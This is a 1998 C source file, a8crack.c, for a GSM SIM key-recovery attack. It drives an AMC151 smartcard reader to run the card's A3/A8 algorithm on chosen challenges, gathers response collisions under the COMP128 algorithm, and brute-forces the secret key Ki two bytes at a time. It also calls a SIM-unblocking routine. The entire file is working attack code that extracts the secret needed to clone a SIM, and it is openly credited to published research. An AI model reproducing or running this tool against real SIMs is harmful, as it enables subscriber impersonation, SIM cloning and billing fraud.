/* 
** (C) Copyright on the following code is reserved by 
**     Michael J. McCormack 1998
** Postal address:    PO BOX 1542
**                    Lane Cove 2066
**                    Australia
** email address:     McCormack@ozemail.com.au
** You may use, modify and distribute it freely for non commercial 
** purposes only, provided this header is left intact.
**
** Filename: a8crack.c
** Date:     22 March 1998
** Description: 
**      Dumps off RAND / SRES / Kc values for a GSM SIM using an AMC151
**         reader and tries to determine the secret value Ki.
**      Assumes the SIM uses the COMP128 algorithm.
**
**      The algorithm used in this code was derived from information
**      supplied by Marc Briceno and Ian Goldberg at URL:
**         http://www.isaac.cs.berkeley.edu/isaac/gsm.html
*/

#include "amc151.h"
#include "sim.h"
#include "unblock.h"
#include <sys/time.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

typedef struct a8pair_s {
    uchar input[16];
    uchar output[12];
} a8pair;

/*
** dump the contents of an a3a8 Rand/Sres/Kc triplet
*/
void printa8pair(const a8pair *x) {
    int i;

    for(i=0; i<sizeof x->input; i++)
        printf("%02X",x->input[i]);
    printf(",");
    for(i=0; i<sizeof x->output; i++)
        printf("%02X",x->output[i]);
    printf("\n");
}

/*
** perform a binary search on existing pairs
*/
int bsrch(uchar *response,a8pair *all, int size) {
    int halfway=size/2,r;

    if(size<=0)
        return 0;
    r=memcmp(response,all[halfway].output,sizeof all[halfway].output);
    if(size==1)
        if(0>=r)
            return 0;
        else
            return 1;
    if(0>=r)
        return bsrch(response,&all[0],halfway);
    else
        return bsrch(response,&all[halfway],size-halfway)+halfway;
}

/*
** add_pair()
** Maintains an array of a3a8 inputs and outputs sorted by output
*/
int add_pair(uchar *rand, uchar *response, a8pair* all, int size) {
    int x,i;

    x=bsrch(response,all,size);
    for(i=size; i>x; i--)
        memcpy(&all[i],&all[i-1],sizeof(a8pair));
    memcpy(&all[x].input,rand,sizeof all[x].input);
    memcpy(&all[x].output,response,sizeof all[x].output);

    if(size && (!memcmp(all[x+1].output,all[x].output,sizeof all[x].output))) {
        printf("Pairs identical!\n");
        printa8pair(&all[x]);
        printa8pair(&all[x+1]);
        return x;
    }
    return -1;
}

/* check that there are no anomolies in the sorted data structure */
void verify_pairs(a8pair *all,int size) {
    int i;

    for(i=0; i<size; i++) {
        /* printa8pair(&all[i]); */
        if((i<size-1)&&
           (0<=memcmp(all[i].output,all[i+1].output,sizeof all[i].output))) {
            printf("Anomoly!\n");
        }
    }
}

/*
** calc_key
** calculates two bytes of the key from a collission
*/
int calc_key(a8pair *x, a8pair *y, int i) {
    int k;
    uchar key[16];
    uchar output1[32], output2[32];

    memset(key,0,sizeof key);
    for(k=0; k<0x10000; k++) {
        key[i]=k&0xff;
        key[i+8]=(k>>8)&0xff;
        A3A8_tworounds(x->input,key,output1);
        A3A8_tworounds(y->input,key,output2);
        if ( (output1[i]==output2[i]) &&
             (output1[i+8]==output2[i+8]) &&
             (output1[i+16]==output2[i+16]) &&
             (output1[i+24]==output2[i+24]) ) {
             return k;
        }
    }
    return -1;
}

/*
** save the key value
*/
void store_key(int i, int k) {
    int j;
    static uchar key_mask[16]={0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    static uchar key_val[16];

    if(k>=0) {
        key_mask[i]=0xff;
        key_mask[i+8]=0xff;
        key_val[i]=k&0xff;
        key_val[i+8]=(k>>8)&0xff;
        for(j=0; j<sizeof key_val; j++) {
            if(key_mask[j])
                printf("%02X",key_val[j]);
            else
                printf("XX");
        }
        printf("\n");
    }
    else
        printf("Could not resolve key!\n");
}

/*
**  find_collisions()
**
**  Retrieve various input/output pairs for the A3/A8 algorithms
**  and save them to a file.
*/

#ifdef LOG
int find_collisions(int sp,FILE *data) {
#else
int find_collisions(int sp) {
#endif
    uchar rand[100],response[100];
    a8pair *all;
    int len,i,j,status,x;

    /* need to select DF_GSM to use run_algorithm */
    sim_select(sp,MAINFILE,response,sizeof response);
    if(0>sim_select(sp,DF_GSM,response,sizeof response)) {
        printf("Unable to select DF_GSM.\n");
        return 1;
    }

    /* allocate a buffer */
    all = (a8pair*)malloc(sizeof(a8pair)*0x10000);
    if(!all) {
        printf("Unable to malloc memory for pairs.\n");
        return 1;
    }

    /* search for eigth collisions */
    for(i=0; i<8; i++) {
        /* randomise with time of day */
        memset(rand,0x00,sizeof rand);
        /* gettimeofday((struct timeval *)&rand[0],(struct timezone *)&rand[8]); */
    
        /* gather data */
        for(j=0; j<0x10000; j++) {
            if(!(j%16))
                fprintf(stderr,"Read %d pairs\r",i*0x10000+j);
            do {
                rand[i+0]=j%0x100;
                rand[i+8]=(j>>8)%0x100;
                len=sim_run_algorithm(sp,rand,response);
                status = response[len-2]*0x100 + response[len-1];
                if((len<0)||(status!=0x9000))
                    fprintf(stderr,"Run algorithm failed.\n");
            } while (status!=0x9000);

            x=add_pair(rand,response,all,j);
            if(!(j%1000)) {
                verify_pairs(all,j+1);
            }
            if(x>=0)
                break;
        }
        fprintf(stderr,"\n");

        /* check that we have a valid collision, then work out the key data */
        if(x>=0) {
            int k;

            printf("Found collision.\n");
            k = calc_key(&all[x],&all[x+1],i);
            store_key(i,k);
            fflush(stdout);
        }
        else  {
            printf("Exhausted key space.\n");
            fflush(stdout);
        }
    }
    free(all);
    return 0;
}

/*
** return an ascii string representing the ICC Identifier
*/
char *get_iccnum(int sp) {
    uchar response[100],iccid[10];
    static uchar ascii_id[21];
    int i,len;

    sim_select(sp,MAINFILE,response,sizeof response);
    if(0>sim_select(sp,EF_ICCID,response,sizeof response))
        printf("get_iccnum(): Select failed!\n");
    len = sim_read_binary(sp,iccid,0,10);
    if(len!=10)
        printf("get_iccnum(): Read failed!\n");
    for(i=0; i<len*2; i++) {
        sprintf(&ascii_id[i],"%X",
            ((i%2) ? (iccid[i/2]>>4) : (iccid[i/2]&0xf)));
    }
    return ascii_id;
}

/*
** stuff for catching quit and kill signals
*/
static jmp_buf jmp_env;
void catch(int x) {
    longjmp(jmp_env,1);
}

/*
** main function
*/
int main(int argc, char *argv[]) {
    int sp;
    struct termios tios;
    uchar response[100];
#ifdef LOG
    char filename[80];
    FILE *datafile=NULL;
#endif

    sp=open(argv[1]?argv[1]:"/dev/amc151",O_RDWR);
    if(sp<0) {
        printf("Serial port init failed.\n");
        return 1;
    }

    init_port(sp,&tios);

    if(amc151_warm_reset(sp)<0)
        printf("Warm reset failed\n");

    amc151_version(sp);

    /* check that a smartcard is seated in the reader */
    if(!(amc151_reader_status(sp)&0x02)) {
        printf("No card in reader!\n");
        return 1;
    }

    /* catch a control break */
    if(!setjmp(jmp_env)) {
        signal(SIGINT,catch);
        signal(SIGQUIT,catch);

        if(13>amc151_icc_power_on(sp,response,sizeof response)) {
            printf("Bad response to Reset!\n");
            return 1;
        }
        amc151_green_led(sp,1); /* green led on */

        unblock_sim(sp);

        /* construct a filename that will be unique for each SIM */
#ifdef LOG
        sprintf(filename,"data.%s",get_iccnum(sp));
        printf("Filename = %s\n",filename);
        datafile=fopen(filename,"wb");
        find_collisions(sp,datafile);
#else
        find_collisions(sp);
#endif
    }
    else {
        printf("Stopped!\n");
        usleep(100000);
    }

#ifdef LOG
    if(datafile)
        fclose(datafile);
#endif

    if(0>amc151_green_led(sp,0)) { /* green led off */
        printf("Green led still on...");
        amc151_green_led(sp,0);
    }
    amc151_icc_power_off(sp);
    close(sp);
}

